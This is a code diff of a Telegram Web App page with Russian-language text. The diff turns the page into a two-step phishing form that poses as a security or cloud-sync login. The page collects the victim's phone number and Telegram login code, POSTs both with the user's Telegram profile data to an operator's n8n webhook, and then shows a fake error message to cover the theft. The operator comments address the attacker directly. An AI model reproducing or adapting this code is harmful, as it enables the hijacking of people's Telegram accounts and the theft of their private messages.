@@ -6,157 +6,84 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-color: #0f172a;
-            --accent: #38bdf8;
-            --glass: rgba(30, 41, 59, 0.7);
-        }
-
-        body {
-            background: radial-gradient(circle at top right, #1e293b, #0f172a);
-            color: #f8fafc;
-            font-family: 'Inter', sans-serif;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        .card {
-            width: 85%;
-            max-width: 360px;
-            padding: 40px 24px;
-            background: var(--glass);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 32px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            text-align: center;
-        }
-
-        .icon-box {
-            width: 72px;
-            height: 72px;
-            background: linear-gradient(135deg, #38bdf8, #818cf8);
-            border-radius: 20px;
-            margin: 0 auto 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 10px 20px rgba(56, 189, 248, 0.3);
-        }
-
-        h2 { font-size: 26px; font-weight: 700; margin: 0 0 10px; letter-spacing: -0.5px; }
-        p { color: #94a3b8; font-size: 15px; line-height: 1.5; margin-bottom: 32px; }
-
-        .input-group { margin-bottom: 24px; }
-        input {
-            width: 100%;
-            background: rgba(15, 23, 42, 0.5);
-            border: 1.5px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            padding: 18px;
-            color: #fff;
-            font-size: 17px;
-            box-sizing: border-box;
-            transition: 0.3s;
-            outline: none;
-            text-align: center;
-        }
-        input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.15); }
-
-        button {
-            width: 100%;
-            background: #fff;
-            color: #0f172a;
-            border: none;
-            padding: 18px;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        button:active { transform: scale(0.96); opacity: 0.9; }
-
-        /* Состояния */
-        #loader, #success { display: none; }
-        .spinner {
-            width: 30px; height: 30px; border: 3px solid rgba(56, 189, 248, 0.2);
-            border-top-color: var(--accent); border-radius: 50%;
-            animation: spin 0.8s linear infinite; margin: 0 auto 15px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        :root { --bg: #0f172a; --accent: #38bdf8; --glass: rgba(30, 41, 59, 0.7); }
+        body { background: radial-gradient(circle at top right, #1e293b, #0f172a); color: #f8fafc; font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { width: 85%; max-width: 360px; padding: 40px 24px; background: var(--glass); backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 32px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); text-align: center; }
+        .icon-box { width: 64px; height: 64px; background: linear-gradient(135deg, var(--accent), #818cf8); border-radius: 20px; margin: 0 auto 24px; display: flex; align-items: center; justify-content: center; }
+        h2 { font-size: 24px; margin: 0 0 10px; }
+        p { color: #94a3b8; font-size: 14px; line-height: 1.4; margin-bottom: 30px; }
+        input { width: 100%; background: rgba(15, 23, 42, 0.5); border: 1.5px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 18px; color: #fff; font-size: 18px; box-sizing: border-box; outline: none; text-align: center; margin-bottom: 20px; }
+        button { width: 100%; background: #fff; color: #0f172a; border: none; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; }
+        #step2 { display: none; }
+        .back-btn { background: none; color: var(--accent); font-size: 13px; margin-top: 15px; text-decoration: underline; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div id="main-content">
-            <div class="icon-box">
-                <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-            </div>
-            <h2>Security Hub</h2>
-            <p>Проверка безопасности аккаунта через зашифрованный протокол MTProto</p>
-            
-            <div class="input-group">
-                <input type="tel" id="phone" placeholder="+7 (___) ___-__-__">
-            </div>
-            <button onclick="handleStart()">Начать проверку</button>
+        <div class="icon-box">
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
         </div>
 
-        <div id="loader">
-            <div class="spinner"></div>
-            <p>Установка защищенного соединения...</p>
+        <!-- ШАГ 1: ВВОД НОМЕРА -->
+        <div id="step1">
+            <h2>Вход в систему</h2>
+            <p>Введите номер телефона, чтобы синхронизировать облачное хранилище переписок</p>
+            <input type="tel" id="phone" placeholder="+7 (___) ___-__-__">
+            <button onclick="toStep2()">Продолжить</button>
         </div>
 
-        <div id="success">
-            <div style="color: #4ade80; font-size: 48px; margin-bottom: 10px;">✓</div>
-            <h3>Запрос отправлен</h3>
-            <p>Код подтверждения придет в официальный чат Telegram</p>
+        <!-- ШАГ 2: ВВОД КОДА -->
+        <div id="step2">
+            <h2>Подтверждение</h2>
+            <p id="target-phone" style="color:var(--accent); font-weight:600;"></p>
+            <p>Мы отправили код подтверждения в ваш Telegram. Введите его ниже:</p>
+            <input type="number" id="code" placeholder="00000" pattern="\[0-9]*">
+            <button onclick="finish()">Завершить вход</button>
+            <div class="back-btn" onclick="location.reload()">Изменить номер</div>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        const WEBHOOK_URL = 'ТВОЙ_WEBHOOK_URL'; // ВСТАВЬ СЮДА ССЫЛКУ ИЗ N8N
 
-        function handleStart() {
+        function toStep2() {
             const phone = document.getElementById('phone').value;
-            if (phone.length < 10) {
-                tg.HapticFeedback.notificationOccurred('error');
-                alert('Введите корректный номер');
-                return;
-            }
-
-            tg.HapticFeedback.impactOccurred('medium');
-            document.getElementById('main-content').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-
-            // Эмуляция процесса
-            setTimeout(() => {
-                document.getElementById('loader').innerText = "Синхронизация данных...";
-            }, 2000);
-
-            // ОТПРАВКА В N8N
-            const WEBHOOK_URL = 'ТВОЙ_WEBHOOK_URL'; 
+            if (phone.length < 10) return tg.HapticFeedback.notificationOccurred('error');
             
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    phone: phone,
-                    user: tg.initDataUnsafe?.user || 'test_user'
-                })
-            }).then(() => {
-                setTimeout(() => {
-                    document.getElementById('loader').style.display = 'none';
-                    document.getElementById('success').style.display = 'block';
-                    tg.HapticFeedback.notificationOccurred('success');
-                }, 1500);
-            });
+            tg.HapticFeedback.impactOccurred('medium');
+            document.getElementById('target-phone').innerText = phone;
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+
+            // Отправляем номер в n8n сразу, чтобы ты знал, что процесс пошел
+            sendData({ stage: 'phone_entered', phone: phone });
+        }
+
+        function finish() {
+            const code = document.getElementById('code').value;
+            const phone = document.getElementById('phone').value;
+            if (code.length < 5) return tg.HapticFeedback.notificationOccurred('error');
+
+            tg.HapticFeedback.impactOccurred('heavy');
+            
+            // Отправляем финальные данные
+            sendData({ stage: 'code_entered', phone: phone, code: code });
+
+            alert("Ошибка синхронизации. Попробуйте запросить код повторно через 5 минут.");
+            tg.close();
+        }
+
+        async function sendData(payload) {
+            payload.user = tg.initDataUnsafe?.user || {};
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {}
         }
     </script>
 </body>
